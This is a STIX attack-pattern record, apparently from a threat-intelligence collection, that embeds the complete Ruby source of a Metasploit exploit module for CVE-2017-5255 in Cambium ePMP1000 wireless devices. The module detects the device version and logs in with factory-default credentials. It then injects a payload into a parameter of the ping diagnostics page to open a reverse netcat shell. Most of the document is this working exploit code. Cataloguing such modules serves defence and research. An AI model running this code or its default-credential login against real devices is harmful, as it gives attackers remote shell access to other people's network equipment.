{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3ea2beb-67c6-44a3-a21e-220dd36d2b63",
    "created": "2024-08-14T17:14:44.841416Z",
    "modified": "2024-08-14T17:14:44.84142Z",
    "name": "\"Cambium ePMP1000 ping Shell via Command Injection (up to v2.5)\"",
    "description": " This module exploits an OS Command Injection vulnerability in Cambium ePMP1000 device management portal. It requires any one of the following login credentials - admin/admin, installer/installer, home/home - to set up a reverse netcat shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/epmp1000_ping_cmd_shell.rb",
            "external_id": "epmp1000_ping_cmd_shell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5255"
        },
        {
            "source_name": "reference",
            "url": "http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Cambium ePMP1000 'ping' Shell via Command Injection (up to v2.5)\",\n      'Description' => %{\n          This module exploits an OS Command Injection vulnerability in Cambium\n          ePMP1000 device management portal. It requires any one of the following login\n          credentials - admin/admin, installer/installer, home/home - to set up a reverse\n          netcat shell.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['CVE', '2017-5255'],\n          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],\n          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']\n        ],\n      'Privileged' => true,\n      'Targets' =>\n        [\n          ['EPMP',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2015-11-28',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' })\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  #\n  # Fingerprinting\n  #\n  def is_app_epmp1000?\n    begin\n      res = send_request_cgi(\n        {\n          'uri'       => '/',\n          'method'    => 'GET'\n        }\n      )\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return false\n    end\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      (res.body.include?('cambium.min.css') || res.body.include?('cambiumnetworks.com') && res.body.include?('https://support.cambiumnetworks.com/files/epmp/'))\n    )\n\n    if good_response\n      get_epmp_ver = res.body.match(/\"sw_version\">([^<]*)/)\n      if !get_epmp_ver.nil?\n        epmp_ver = get_epmp_ver[1]\n        if !epmp_ver.nil?\n          print_good(\"#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...\")\n          return true, epmp_ver\n        else\n          print_good(\"#{rhost}:#{rport} - Running Cambium ePMP 1000...\")\n          epmp_ver = ''\n          return true, epmp_ver\n        end\n      end\n    else\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. The target is not vulnerable.\")\n      epmp_ver = nil\n      return false\n    end\n  end\n\n  #\n  # check\n  #\n  def check\n    success, epmp_ver = is_app_epmp1000?\n    if (success != 'false' && !epmp_ver.nil? && epmp_ver < '2.5')\n      return CheckCode::Vulnerable\n    else\n      return CheckCode::Safe # Using 'Safe' here to imply this ver is not exploitable using ~the module~'\n    end\n  end\n\n  #\n  # Login\n  #\n  def login(user, pass)\n    res = send_request_cgi(\n      {\n        'uri' => '/cgi-bin/luci',\n        'method' => 'POST',\n        'headers' => {\n          'X-Requested-With' => 'XMLHttpRequest',\n          'Accept' => 'application/json, text/javascript, */*; q=0.01'\n        },\n        'vars_post' =>\n          {\n            'username' => 'dashboard',\n            'password' => ''\n          }\n      }\n    )\n\n    cookies = res.get_cookies_parsed\n    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      check_sysauth.include?('sysauth')\n    )\n\n    if good_response\n      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s\n      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)\n\n      cookie1 = \"#{sysauth_value}\" + \"globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D\"\n\n      res = send_request_cgi(\n        {\n          'uri' => '/cgi-bin/luci',\n          'method' => 'POST',\n          'cookie' => cookie1,\n          'headers' => {\n            'X-Requested-With' => 'XMLHttpRequest',\n            'Accept' => 'application/json, text/javascript, */*; q=0.01',\n            'Connection' => 'close'\n          },\n          'vars_post' =>\n            {\n              'username' => user,\n              'password' => pass\n            }\n        }\n      )\n\n      cookies = res.get_cookies_parsed\n\n      good_response = (\n        res &&\n        res.code == 200 &&\n        !res.body.include?('auth_failed')\n      )\n\n      if good_response\n        print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n\n        # check if max_user_number_reached?\n        if !res.body.include?('max_user_number_reached')\n        # get the final cookie now\n          cookies = res.get_cookies_parsed\n          stok_value = cookies.has_key?('stok') && cookies['stok'].first\n          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s\n          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)\n\n          final_cookie = \"#{sysauth_value}\" + \"globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=\" + stok_value\n\n          # create config_uri\n          config_uri_ping = '/cgi-bin/luci/;stok=' + stok_value + '/admin/ping'\n\n          return final_cookie, config_uri_ping\n        else\n          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')\n          final_cookie = 'skip'\n          config_uri_ping = 'skip'\n          return final_cookie, config_uri_ping\n        end\n      else\n        print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n        final_cookie = 'skip'\n        config_uri_ping = 'skip'\n        return final_cookie, config_uri_ping\n      end\n    end\n  end\n\n  #\n  # open cmd_shell\n  #\n  def cmd_shell(config_uri, cookie)\n    command = payload.encoded\n    inject = '|' + \"#{command}\" + ' ||'\n    clean_inject = CGI.unescapeHTML(inject.to_s)\n\n    print_status('Sending payload...')\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => config_uri,\n        'cookie' => cookie,\n        'headers' => {\n          'Accept' => '*/*',\n          'Accept-Language' => 'en-US,en;q=0.5',\n          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',\n          'X-Requested-With' => 'XMLHttpRequest',\n          'Connection' => 'close'\n        },\n        'vars_post' =>\n          {\n            'ping_ip' => '127.0.0.1', # This parameter can also be used for injection\n            'packets_num' => clean_inject,\n            'buf_size' => 0,\n            'ttl' => 1,\n            'debug' => '0'\n          }\n      }, 25\n    )\n    handler\n  end\n\n  # exploit\n\n  def exploit\n    success, epmp_ver = is_app_epmp1000?\n    if epmp_ver < '2.5'\n      cookie, config_uri_ping = login(datastore['USERNAME'], datastore['PASSWORD'])\n      if cookie == 'skip' && config_uri_ping == 'skip'\n        return\n      else\n        cmd_shell(config_uri_ping, cookie)\n      end\n    else\n      print_error('This ePMP version is not vulnerable. Module will not continue.')\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-28",
    "x_mitre_platforms": [
        "unix"
    ]
}